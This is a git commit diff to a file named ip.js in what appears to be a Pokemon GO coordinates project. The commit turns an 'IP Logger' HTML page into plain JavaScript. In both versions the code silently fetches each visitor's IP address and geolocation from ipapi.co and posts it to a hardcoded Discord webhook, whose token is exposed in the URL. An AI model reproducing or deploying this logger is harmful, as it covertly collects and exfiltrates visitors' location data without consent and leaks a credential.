0d03e0b337a1bf615955ea7e777dcb473f5df79a
Pokemon GO Coordinates <168881691+pgcoordinates@users.noreply.github.com>
2024-11-03 08:19:09 +0530

    Update ip.js

--- ip.js
+++ ip.js
@@ -1,31 +1,19 @@
-<!DOCTYPE html>
-<html lang="en">
-<head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>IP Logger</title>
-</head>
-<body>
-    <script>
-        // Fetch user information from IPAPI
-        fetch("https://ipapi.co/json/")
-            .then(response => response.json())
-            .then(data => {
-                // Prepare JSON payload for the webhook
-                const jsonData = {
-                    content: JSON.stringify(data, null, 2) // Format data as a JSON string
-                };
+// Fetch user information from IPAPI
+fetch("https://ipapi.co/json/")
+    .then(response => response.json())
+    .then(data => {
+        // Prepare JSON payload for the webhook
+        const jsonData = {
+            content: JSON.stringify(data, null, 2) // Format data as a JSON string
+        };
 
-                // Send the data to the Discord webhook
-                fetch("https://discord.com/api/webhooks/1249231367057834014/IkOD3gMKxASoxgHzZSXlRLeFHchi3faP9zyPsUFAs7Z12dg7uE700dHL05A0R-9yUyHN", {
-                    method: "POST",
-                    headers: {
-                        "Content-Type": "application/json"
-                    },
-                    body: JSON.stringify(jsonData)
-                });
-            })
-            .catch(error => console.error("Error fetching IP data:", error));
-    </script>
-</body>
-</html>
+        // Send the data to the Discord webhook
+        fetch("https://discord.com/api/webhooks/1249231367057834014/IkOD3gMKxASoxgHzZSXlRLeFHchi3faP9zyPsUFAs7Z12dg7uE700dHL05A0R-9yUyHN", {
+            method: "POST",
+            headers: {
+                "Content-Type": "application/json"
+            },
+            body: JSON.stringify(jsonData)
+        });
+    })
+    .catch(error => console.error("Error fetching IP data:", error));
